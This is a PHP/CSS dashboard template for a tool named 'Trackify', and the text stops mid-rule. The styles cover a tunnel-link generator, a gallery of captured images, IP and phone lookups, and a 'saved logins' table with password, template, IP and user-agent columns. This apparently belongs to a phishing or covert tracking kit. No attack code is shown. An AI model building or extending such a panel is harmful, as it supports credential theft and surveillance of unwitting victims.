<?php
declare(strict_types=1);

if (!defined('TRACKIFY_PANEL')) {
    http_response_code(403);
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'Forbidden';
    exit;
}

$userNavName = $userNavName ?? 'Account';
$userNavInitial = $userNavInitial ?? '?';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trackify - Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0d1117;
            --bg-card: #161b22;
            --bg-input: #21262d;
            --border: #30363d;
            --text: #e6edf3;
            --text-muted: #8b949e;
            --accent: #58a6ff;
            --accent-green: #3fb950;
            --accent-yellow: #d29922;
            --accent-red: #f85149;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Space Grotesk', sans-serif;
            background: var(--bg-dark);
            color: var(--text);
            min-height: 100vh;
            background-image: radial-gradient(ellipse at top, #1a2332 0%, #0d1117 70%);
        }
        .layout {
            display: grid;
            grid-template-columns: minmax(380px, 1fr) minmax(460px, 580px) 360px;
            min-height: auto;
            align-content: start;
        }
        @media (max-width: 1200px) {
            .layout { grid-template-columns: 1fr 360px; }
            .gallery-section { order: 3; grid-column: 1 / -1; }
        }
        @media (max-width: 900px) {
            .layout { grid-template-columns: 1fr; }
        }
        .main {
            padding: 24px 28px 28px;
            overflow-y: auto;
        }
        .gallery-section {
            background: var(--bg-card);
            border-left: 1px solid var(--border);
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }
        @media (max-width: 1200px) {
            .gallery-section { border-left: none; border-top: 1px solid var(--border); }
        }
        .sidebar {
            background: var(--bg-card);
            border-left: 1px solid var(--border);
            padding: 24px;
            overflow-y: auto;
        }
        @media (max-width: 900px) {
            .sidebar { border-left: none; border-top: 1px solid var(--border); }
        }
        .gallery-section .card.gallery-panel-head {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            gap: 10px;
            margin-bottom: 18px;
        }
        .gallery-header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
        }
        .gallery-toolbar {
            display: none;
            align-items: center;
            gap: 14px;
            flex-wrap: wrap;
        }
        .gallery-toolbar-label {
            font-size: 13px;
            color: var(--text-muted);
            display: inline-flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            user-select: none;
        }
        .gallery-btn {
            font-size: 12px;
            padding: 6px 12px;
            border-radius: 6px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text);
            cursor: pointer;
            font-family: inherit;
        }
        .gallery-btn:disabled {
            opacity: 0.45;
            cursor: not-allowed;
        }
        .gallery-btn.danger {
            border-color: var(--accent-red);
            color: var(--accent-red);
        }
        .gallery-btn.danger:not(:disabled):hover {
            background: rgba(248,81,73,0.12);
        }
        .gallery-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text);
        }
        .gallery-stats {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            gap: 12px;
            align-self: start;
            width: 100%;
        }
        .gallery-item {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            border-radius: 8px;
            overflow: hidden;
            background: var(--bg-input);
            border: 1px solid var(--border);
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .gallery-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
            border-color: var(--accent);
        }
        .gallery-item:focus {
            outline: 2px solid var(--accent);
            outline-offset: 2px;
        }
        .gallery-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            pointer-events: none;
            user-select: none;
        }
        .gallery-item-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 4px 6px;
            background: linear-gradient(transparent, rgba(0,0,0,0.85));
            color: rgba(255,255,255,0.9);
            font-size: 9px;
            font-family: 'JetBrains Mono', monospace;
        }
        .gallery-item-actions {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 4px;
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            z-index: 3;
            pointer-events: none;
        }
        .gallery-item-actions > * {
            pointer-events: auto;
        }
        .gallery-select-cb {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: var(--accent);
        }
        .gallery-delete-one {
            width: 26px;
            height: 26px;
            border: none;
            border-radius: 6px;
            background: rgba(248,81,73,0.92);
            color: #fff;
            font-size: 16px;
            line-height: 1;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: inherit;
            padding: 0;
        }
        .gallery-delete-one:hover {
            background: var(--accent-red);
        }
        .gallery-select-label {
            margin: 0;
            padding: 2px;
            background: rgba(0,0,0,0.35);
            border-radius: 4px;
        }
        .capture-quota-banner {
            font-size: 13px;
            line-height: 1.45;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid rgba(210,153,34,0.45);
            background: rgba(210,153,34,0.12);
            color: var(--accent-yellow);
        }
        .gallery-empty {
            grid-column: 1 / -1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 24px;
            text-align: center;
        }
        .gallery-empty-icon {
            width: 80px;
            height: 80px;
            margin-bottom: 24px;
            background: linear-gradient(135deg, rgba(88,166,255,0.2), rgba(163,113,247,0.2));
            border: 2px dashed rgba(88,166,255,0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            animation: pulse-glow 3s ease-in-out infinite;
        }
        @keyframes pulse-glow {
            0%, 100% { opacity: 1; transform: scale(1); border-color: rgba(88,166,255,0.4); }
            50% { opacity: 0.9; transform: scale(1.03); border-color: rgba(163,113,247,0.5); }
        }
        .gallery-empty-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .gallery-empty-text {
            color: var(--text-muted);
            font-size: 13px;
            max-width: 280px;
            line-height: 1.5;
        }
        .gallery-empty-hint {
            margin-top: 16px;
            font-size: 12px;
            color: var(--text-muted);
            opacity: 0.8;
        }
        .pagination {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid var(--border);
            width: 100%;
        }
        .pagination-btn {
            min-width: 40px;
            height: 40px;
            padding: 0 12px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text);
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        .pagination-btn:hover:not(:disabled) {
            border-color: var(--accent);
            background: rgba(88,166,255,0.1);
        }
        .pagination-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        .pagination-info {
            font-size: 13px;
            color: var(--text-muted);
            padding: 0 16px;
        }
        .lightbox {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        .lightbox.show {
            opacity: 1;
            visibility: visible;
        }
        .lightbox img {
            max-width: 100%;
            max-height: 90vh;
            object-fit: contain;
            border-radius: 8px;
        }
        .lightbox-close {
            position: absolute;
            top: 24px;
            right: 24px;
            width: 44px;
            height: 44px;
            border: none;
            background: rgba(255,255,255,0.1);
            color: white;
            border-radius: 50%;
            font-size: 24px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .lightbox-close:hover {
            background: rgba(255,255,255,0.2);
        }
        .title-row {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            gap: 16px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .title-row h1 {
            margin-bottom: 0;
        }
        .user-nav {
            position: relative;
            flex-shrink: 0;
            z-index: 200;
        }
        .user-nav-trigger {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            font-weight: 600;
            font-family: inherit;
            color: var(--text);
            padding: 0;
            border-radius: 999px;
            border: none;
            background: transparent;
            cursor: pointer;
        }
        .user-nav-trigger:hover {
            color: #fff;
        }
        .user-nav-trigger[aria-expanded="true"] {
            border-color: var(--accent);
        }
        .user-nav-trigger[aria-expanded="true"] .user-nav-chevron {
            transform: rotate(180deg);
        }
        .user-nav-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .user-nav-name {
            max-width: 160px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        @media (max-width: 600px) {
            .user-nav-name { max-width: 100px; }
        }
        .user-nav-chevron {
            color: var(--text-muted);
            flex-shrink: 0;
            transition: transform 0.2s;
        }
        .user-nav-dropdown {
            position: absolute;
            top: calc(100% + 8px);
            right: 0;
            min-width: 212px;
            padding: 6px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 10px;
            box-shadow: 0 16px 40px rgba(0,0,0,0.45);
        }
        .user-nav-dropdown[hidden] {
            display: none !important;
        }
        .user-nav-item {
            display: block;
            padding: 10px 12px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 500;
            color: var(--text);
            text-decoration: none;
            transition: background 0.15s;
        }
        .user-nav-item:hover {
            background: var(--bg-input);
        }
        .user-nav-item--danger {
            color: var(--accent-red);
        }
        .user-nav-item--danger:hover {
            background: rgba(248, 81, 73, 0.1);
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #58a6ff, #a371f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.55;
            max-width: 48rem;
        }
        .card > .subtitle.card-view-desc {
            margin-top: 8px;
            margin-bottom: 18px;
            max-width: none;
        }
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 24px;
        }
        .layout .card {
            padding: 20px;
            margin-bottom: 18px;
        }
        .card h2 {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        label {
            display: block;
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 8px;
        }
        select, input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            font-family: inherit;
            margin-bottom: 16px;
        }
        select:focus, input:focus {
            outline: none;
            border-color: var(--accent);
        }
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            height: 44px;
            padding: 0 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: all 0.2s;
            box-sizing: border-box;
        }
        .btn-primary {
            background: linear-gradient(135deg, #238636, #2ea043);
            color: white;
        }
        .btn-primary:hover {
            filter: brightness(1.1);
            transform: translateY(-1px);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-generate {
            width: 100%;
            margin-top: 20px;
            min-height: 50px;
            padding: 0 28px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            letter-spacing: 0.02em;
            box-shadow: 0 2px 14px rgba(35, 134, 54, 0.32);
        }
        .btn-generate:hover:not(:disabled) {
            box-shadow: 0 4px 20px rgba(35, 134, 54, 0.42);
        }
        .btn-generate:active:not(:disabled) {
            transform: translateY(0);
            filter: brightness(0.98);
        }
        .btn-generate-icon {
            flex-shrink: 0;
            opacity: 0.95;
        }
        .btn-secondary {
            background: var(--bg-input);
            color: var(--text);
            border: 1px solid var(--border);
        }
        .btn-secondary:hover {
            background: var(--border);
        }
        .link-box {
            display: flex;
            align-items: stretch;
            gap: 12px;
            margin-top: 16px;
        }
        .tunnel-controls-wrap {
            margin-top: 16px;
        }
        .tunnel-controls-wrap .link-box {
            margin-top: 0;
            width: 100%;
        }
        .tunnel-link-group {
            display: flex;
            flex: 1;
            min-width: 0;
            gap: 12px;
            align-items: stretch;
        }
        .link-box.link-box--stop-only .tunnel-link-group {
            display: none;
        }
        .link-box.link-box--stop-only {
            justify-content: flex-end;
        }
        .link-box .btn {
            height: 44px;
            min-width: 44px;
            padding: 0 16px;
        }
        .link-input {
            flex: 1;
            height: 44px;
            padding: 0 16px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            box-sizing: border-box;
        }
        .terminal-cursor {
            display: inline-block;
            width: 8px;
            height: 16px;
            background: var(--accent);
            animation: blink 1s step-end infinite;
            vertical-align: -2px;
        }
        @keyframes blink {
            50% { opacity: 0; }
        }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
        }
        .status-badge.active {
            background: rgba(63, 185, 80, 0.2);
            color: var(--accent-green);
        }
        .status-badge.inactive {
            background: rgba(248, 81, 73, 0.2);
            color: var(--accent-red);
        }
        .status-badge::before {
            content: '';
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: currentColor;
        }
        .status-badge.inactive::before { background: var(--accent-red); }
        .btn-danger {
            background: rgba(248, 81, 73, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }
        .btn-danger:hover {
            background: rgba(248, 81, 73, 0.3);
        }
        .captures-list {
            max-height: 200px;
            overflow-y: auto;
        }
        .capture-item {
            padding: 12px;
            background: var(--bg-input);
            border-radius: 8px;
            margin-bottom: 8px;
            font-size: 13px;
        }
        .capture-item .ip { color: var(--accent); font-weight: 500; }
        .capture-item .time { color: var(--text-muted); font-size: 12px; }
        .empty-state {
            color: var(--text-muted);
            text-align: center;
            padding: 32px;
            font-size: 14px;
        }
        .card-header-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 12px;
        }
        .card-header-row h2 {
            margin-bottom: 0;
        }
        .mini-btn {
            height: 30px;
            padding: 0 12px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .mini-btn:hover {
            color: var(--text);
            border-color: var(--accent);
        }
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            padding: 12px 20px;
            background: var(--accent-green);
            color: white;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            transform: translateY(100px);
            opacity: 0;
            transition: all 0.3s;
            z-index: 1000;
        }
        .toast.show {
            transform: translateY(0);
            opacity: 1;
        }
        .side-nav-spacer {
            flex: 1;
            min-height: 8px;
        }
        .side-nav-disclaimer-wrap {
            width: 100%;
            display: flex;
            justify-content: center;
            flex-shrink: 0;
        }
        .disclaimer-link {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 13px;
            color: var(--accent);
            cursor: pointer;
            padding: 8px 16px;
            border-radius: 20px;
            background: rgba(88, 166, 255, 0.12);
            border: 1px solid rgba(88, 166, 255, 0.25);
            transition: all 0.2s ease;
            font-family: inherit;
        }
        .disclaimer-link:hover {
            color: #79b8ff;
            background: rgba(88, 166, 255, 0.2);
            border-color: rgba(88, 166, 255, 0.4);
        }
        .disclaimer-link svg {
            width: 14px;
            height: 14px;
            opacity: 0.8;
            flex-shrink: 0;
        }
        .disclaimer-link.disclaimer-link--rail {
            width: 40px;
            height: 40px;
            padding: 0;
            border-radius: 10px;
            background: transparent;
            border: none;
            color: var(--text-muted);
        }
        .disclaimer-link.disclaimer-link--rail:hover {
            color: var(--text);
            background: rgba(88, 166, 255, 0.12);
            border: none;
        }
        .disclaimer-link.disclaimer-link--rail svg {
            width: 18px;
            height: 18px;
            opacity: 1;
        }
        .disclaimer-link.disclaimer-link--rail:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 2px;
        }
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            z-index: 3000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        .modal-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .modal-content {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            max-width: 480px;
            width: 100%;
            max-height: 80vh;
            overflow-y: auto;
            padding: 24px;
            transform: scale(0.95);
            transition: transform 0.3s;
        }
        .modal-overlay.show .modal-content {
            transform: scale(1);
        }
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--text);
        }
        .modal-body {
            font-size: 14px;
            line-height: 1.6;
            color: var(--text-muted);
            margin-bottom: 24px;
        }
        .modal-body p {
            margin-bottom: 12px;
        }
        .modal-close {
            width: 100%;
            padding: 12px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .modal-close:hover {
            background: var(--border);
        }
        .support-float {
            position: fixed;
            right: 20px;
            bottom: 20px;
            z-index: 2600;
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 10px;
        }
        .support-prompt {
            max-width: 280px;
            padding: 12px 14px;
            border-radius: 10px;
            border: 1px solid rgba(88, 166, 255, 0.35);
            background: rgba(13, 17, 23, 0.96);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
            font-size: 13px;
            line-height: 1.45;
            color: var(--text);
        }
        .support-prompt[hidden] {
            display: none !important;
        }
        .support-prompt-actions {
            margin-top: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .support-link-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            height: 34px;
            padding: 0 12px;
            border-radius: 999px;
            border: 1px solid rgba(255, 221, 87, 0.45);
            background: linear-gradient(135deg, #ffdd57, #ffbf00);
            color: #121212;
            font-size: 12px;
            font-weight: 700;
            text-decoration: none;
        }
        .support-link-btn:hover {
            filter: brightness(1.05);
        }
        .support-dismiss-btn {
            height: 34px;
            padding: 0 12px;
            border-radius: 999px;
            border: 1px solid var(--border);
            background: var(--bg-input);
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
        }
        .support-dismiss-btn:hover {
            color: var(--text);
            border-color: var(--accent);
        }
        .support-fab {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            height: 48px;
            padding: 0 16px;
            border: none;
            border-radius: 999px;
            background: linear-gradient(135deg, #ffdd57, #ffbf00);
            color: #111;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 12px 24px rgba(0,0,0,0.35);
            text-decoration: none;
            transition: transform 0.18s ease, filter 0.18s ease;
        }
        .support-fab:hover {
            transform: translateY(-1px);
            filter: brightness(1.04);
        }
        @media (max-width: 680px) {
            .support-float {
                right: 12px;
                bottom: 12px;
            }
            .support-prompt {
                max-width: min(280px, calc(100vw - 24px));
            }
            .support-fab {
                font-size: 12px;
                padding: 0 14px;
            }
        }
        .phone-lookup-input-wrap {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 12px;
        }
        .phone-lookup-error {
            margin-top: -4px;
            margin-bottom: 10px;
            font-size: 12px;
            color: var(--accent-red);
        }
        .phone-lookup-error[hidden] {
            display: none !important;
        }
        .phone-lookup-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
            margin-top: 4px;
        }
        .phone-lookup-results {
            margin-top: 12px;
            font-size: 13px;
        }
        .phone-lookup-terminal {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            background: #05070c;
            border-radius: 10px;
            border: 1px solid var(--border);
            padding: 16px 18px;
            max-height: 340px;
            overflow-y: auto;
            color: #b3b1ad;
        }
        .phone-lookup-terminal-line {
            margin-bottom: 4px;
            word-break: break-all;
        }
        .phone-lookup-terminal-line span.prompt {
            color: #ff8f40;
        }
        .phone-lookup-terminal-line span.link {
            color: #39bae6;
        }
        .phone-lookup-terminal-line span.hint {
            color: #626a73;
        }
        .phone-lookup-terminal-line.green { color: #7fd962; }
        .phone-lookup-terminal-line.cyan { color: #39bae6; }
        .phone-lookup-terminal-line.yellow { color: #ffb454; }
        .phone-lookup-terminal-line.dim { color: #626a73; }
        .phone-lookup-hint {
            color: var(--text-muted);
            font-size: 12px;
        }
        .app-shell {
            display: flex;
            min-height: 100vh;
        }
        .side-nav {
            width: 72px;
            min-height: 100vh;
            background: #05070c;
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px 8px 20px;
            gap: 12px;
            box-sizing: border-box;
        }
        .side-nav-logo {
            width: 52px;
            height: 40px;
            padding: 0;
            border: none;
            border-radius: 10px;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 12px;
            cursor: pointer;
            overflow: hidden;
            flex-shrink: 0;
        }
        .side-nav-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            object-position: 12% center;
            display: block;
        }
        .side-nav-logo:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 2px;
        }
        .top-nav-brand {
            display: inline-flex;
            align-items: center;
            padding: 0;
            border: none;
            background: none;
            cursor: pointer;
            line-height: 0;
            margin: 0;
            font: inherit;
        }
        .top-nav-brand img {
            height: 34px;
            width: auto;
            max-width: min(220px, 46vw);
            display: block;
            object-fit: contain;
        }
        .top-nav-brand:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 4px;
            border-radius: 8px;
        }
        .side-nav-item {
            width: 40px;
            height: 40px;
            border-radius: 999px;
            border: none;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            cursor: pointer;
            transition: background 0.15s, color 0.15s, transform 0.15s;
            font-size: 18px;
            text-decoration: none;
            font-family: inherit;
        }
        .side-nav-item:hover {
            color: var(--text);
            background: rgba(88, 166, 255, 0.12);
            transform: translateY(-1px);
        }
        .side-nav-item.active {
            background: #161b22;
            color: var(--accent);
        }
        .phone-layout {
            flex: 1;
            display: none;
            padding: 40px;
            overflow-y: auto;
        }
        .terminal-card-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 12px;
        }
        .terminal-card-head h2 {
            margin-bottom: 0;
        }
        .terminal-card-badge {
            font-size: 11px;
            font-family: 'JetBrains Mono', monospace;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.07em;
            color: var(--accent-green);
            background: rgba(63, 185, 80, 0.12);
            border: 1px solid rgba(63, 185, 80, 0.35);
            padding: 4px 10px;
            border-radius: 999px;
        }
        .terminal-card-badge--saveinfo {
            color: #39bae6;
            background: rgba(57, 186, 230, 0.1);
            border-color: rgba(57, 186, 230, 0.35);
        }
        .card-terminal-panel .phone-lookup-terminal {
            max-height: min(480px, 52vh);
            background: linear-gradient(180deg, #070a10 0%, #05070c 100%);
            box-shadow: inset 0 0 0 1px rgba(88, 166, 255, 0.07);
        }
        .save-info-stack {
            display: flex;
            flex-direction: column;
            gap: 20px;
            min-width: 0;
        }
        .saved-info-wrap {
            margin-top: 0;
        }
        .saved-logins-card .saved-logins-card-head {
            display: flex;
            align-items: baseline;
            justify-content: space-between;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        .saved-logins-card .saved-logins-card-head h2 {
            margin-bottom: 0;
        }
        .saved-logins-count {
            font-size: 12px;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
        }
        .saved-logins-intro {
            margin: 0 0 14px;
            font-size: 13px;
            line-height: 1.5;
        }
        .saved-logins-toolbar {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 14px;
        }
        .saved-logins-toolbar .btn {
            flex: 1 1 auto;
            min-width: 120px;
            justify-content: center;
        }
        .saved-info-table-scroll {
            max-height: min(520px, 55vh);
            overflow: auto;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
            border: 1px solid var(--border);
            border-radius: 10px;
            background: var(--bg-dark);
        }
        .saved-info-table {
            width: max-content;
            min-width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            font-size: 13px;
            table-layout: auto;
        }
        .saved-info-table th,
        .saved-info-table td {
            text-align: left;
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            vertical-align: middle;
            word-break: normal;
            overflow-wrap: anywhere;
        }
        .saved-info-table tbody tr:last-child td {
            border-bottom: none;
        }
        .saved-info-table th {
            position: sticky;
            top: 0;
            z-index: 2;
            color: var(--text-muted);
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            background: #121820;
            box-shadow: 0 1px 0 var(--border);
        }
        .saved-info-table tbody tr:nth-child(even) td {
            background: rgba(255, 255, 255, 0.02);
        }
        .saved-info-table tbody tr:hover td {
            background: rgba(88, 166, 255, 0.08);
        }
        .saved-info-col-time {
            min-width: 12.5rem;
        }
        .saved-info-col-login {
            min-width: 9rem;
            max-width: 18rem;
        }
        .saved-info-col-password {
            min-width: 9rem;
            max-width: 16rem;
        }
        .saved-info-col-template {
            min-width: 7rem;
            white-space: nowrap;
        }
        .saved-info-col-ip {
            min-width: 11rem;
            max-width: 20rem;
            font-size: 12px;
            word-break: break-all;
            overflow-wrap: anywhere;
        }
        .saved-info-col-ua {
            min-width: 14rem;
            max-width: 24rem;
            line-height: 1.45;
            word-break: normal;
            overflow-wrap: break-word;
        }
        .saved-info-cell-mono {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
        }
        .saved-info-cell-template {
            font-weight: 500;
            color: var(--text);
        }
        .saved-info-cell-time {
            white-space: nowrap;
            font-size: 13px;
            color: var(--text);
            font-family: inherit;
            font-weight: 500;
        }
        .saved-info-empty {
            color: var(--text-muted);
            padding: 28px 16px;
            text-align: center;
            font-size: 14px;
            line-height: 1.5;
            border: 1px dashed var(--border);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.2);
        }
        .phone-layout-inner {
            max-width: 1680px;
            margin: 0 auto;
            width: 100%;
        }
        .phone-layout-columns {
            display: grid;
            grid-template-columns: minmax(0, 2fr) minmax(0, 1.3fr);
            gap: 28px;
            align-items: flex-start;
        }
        .phone-layout-columns--saveinfo {
            grid-template-columns: minmax(0, 1fr) minmax(420px, 1.35fr);
        }
        @media (max-width: 1100px) {
            .phone-layout-columns--saveinfo {
                grid-template-columns: minmax(0, 1fr) minmax(300px, 1.15fr);
            }
        }
        .phone-layout-columns > * {
            min-width: 0;
        }
        @media (max-width: 900px) {
            .phone-layout-columns {
                grid-template-columns: 1fr;
            }
        }
        @media (max-width: 820px) {
            .phone-layout {
                padding: 16px;
            }
            .phone-layout-columns {
                gap: 16px;
            }
            .phone-layout .card {
                padding: 16px;
            }
            .phone-history-list {
                max-height: 320px;
            }
            .phone-lookup-terminal {
                font-size: 12.5px;
                overflow-x: auto;
                max-width: 100%;
            }
            .phone-lookup-terminal-line {
                word-break: break-word;
            }
            .phone-lookup-actions {
                flex-direction: column;
                align-items: stretch;
            }
            .phone-lookup-actions .btn {
                width: 100%;
            }
        }
        .phone-history-title {
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .phone-history-list {
            border-radius: 10px;
            border: 1px solid var(--border);
            background: var(--bg-card);
            max-height: 260px;
            overflow-y: auto;
            font-size: 12px;
        }
        .phone-history-item {
            padding: 10px 12px;
            border-bottom: 1px solid rgba(48,54,61,0.7);
        }
        .phone-history-item:last-child {
            border-bottom: none;
        }
        .phone-history-number {
            color: var(--accent);
            font-weight: 600;
        }
        .phone-history-meta {
            color: var(--text-muted);
            margin-top: 2px;
            font-size: 11px;
        }
        .phone-history-urls {
            margin-top: 4px;
        }
        .phone-history-urls a {
            display: block;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            color: var(--accent);
            text-decoration: none;
        }
        .phone-history-urls a:hover {
            text-decoration: underline;
        }
        .ip-lookup-details {
            font-size: 13px;
        }
        .ip-lookup-grid {
            border: 1px solid var(--border);
            border-radius: 10px;
            overflow: hidden;
            background: var(--bg-input);
        }
        .ip-lookup-pair-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            border-bottom: 1px solid var(--border);
        }
        .ip-lookup-pair-row:last-child {
            border-bottom: none;
        }
        .ip-lookup-half {
            display: grid;
            grid-template-columns: minmax(100px, 38%) 1fr;
            gap: 10px 14px;
            padding: 12px 16px;
            align-items: baseline;
            border-right: 1px solid var(--border);
        }
        .ip-lookup-half:last-child {
            border-right: none;
        }
        .ip-lookup-lbl {
            color: var(--text-muted);
            font-size: 13px;
            font-weight: 500;
        }
        .ip-lookup-val {
            color: var(--accent-green);
            font-size: 13px;
            font-weight: 600;
            word-break: break-word;
            font-family: 'JetBrains Mono', monospace;
        }
        .ip-lookup-extra {
            margin-top: 16px;
            padding-top: 14px;
            border-top: 1px solid var(--border);
        }
        .ip-lookup-extra h3 {
            font-size: 12px;
            font-weight: 600;
            color: var(--text-muted);
            margin: 0 0 10px 0;
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }
        .ip-lookup-extra-row {
